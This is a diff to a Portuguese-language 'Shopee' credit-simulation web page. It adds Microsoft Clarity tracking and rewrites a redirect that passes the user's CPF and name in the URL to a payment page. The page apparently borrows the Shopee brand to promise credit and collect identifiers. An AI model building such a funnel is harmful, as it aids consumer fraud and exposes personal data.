@@ -1,6 +1,12 @@
 <!DOCTYPE html><html lang="pt-BR"><head><script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
     <meta charset="UTF-8">
-
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "s8vuwmcvbq");
+</script>
 <script async="" defer="" src="js/pixel.js"></script>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Simulação de Crédito | SCrédito Shopee</title>
@@ -413,39 +419,6 @@
     </div>
     
     <script>
-        // Função para preservar parâmetros importantes (UTM, tracking, etc.)
-        function preserveImportantParams() {
-          const urlParams = new URLSearchParams(window.location.search);
-          const importantParams = [
-            "utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content", "utm_id",
-            "fbclid", "gclid", "xcod", "src", "referrer", "source"
-          ];
-          
-          const preservedParams = new URLSearchParams();
-          
-          importantParams.forEach((param) => {
-            if (urlParams.has(param)) {
-              preservedParams.set(param, urlParams.get(param));
-            }
-          });
-          
-          return preservedParams;
-        }
-
-        // Função para criar URL com todos os parâmetros preservados
-        function createUrlWithParams(baseUrl, additionalParams = {}) {
-          const preservedParams = preserveImportantParams();
-          
-          // Adicionar parâmetros adicionais
-          Object.entries(additionalParams).forEach(([key, value]) => {
-            if (value) {
-              preservedParams.set(key, value);
-            }
-          });
-          
-          return `${baseUrl}?${preservedParams.toString()}`;
-        }
-
         document.addEventListener('DOMContentLoaded', function() {
             // Elementos das etapas
             const step1 = document.getElementById('step1');
@@ -620,14 +593,28 @@
                 const cpf = urlParams.get('cpf') || '';
                 const nomeUsuario = urlParams.get('nome') || '';
                 
-                // Criar URL com todos os parâmetros preservados
-                const redirectUrl = createUrlWithParams("../4/index.html", {
-                  cpf: cpf,
-                  nome: nomeUsuario
-                });
+                // Obter o valor aprovado do localStorage
+                const valorAprovado = localStorage.getItem('creditoAprovadoValor') || '';
+                
+                // Criar um novo objeto URLSearchParams para a nova URL
+                const novaUrl = new URLSearchParams();
+                
+                // Adicionar todos os parâmetros atuais à nova URL
+                for (const [chave, valor] of urlParams.entries()) {
+                    novaUrl.append(chave, valor);
+                }
+                
+                // Adicionar ou atualizar parâmetros específicos
+                novaUrl.set('cpf', cpf);
+             
+                
+                // Adicionar o nome se disponível
+                if (nomeUsuario) {
+                    novaUrl.set('nome', nomeUsuario);
+                }
                 
                 // Redirecionar para a página de pagamento com todos os parâmetros
-                window.location.href = redirectUrl;
+                window.location.href = `../4/index.html?${novaUrl.toString()}`;
             });
             
             // Função para simular o processo de verificação
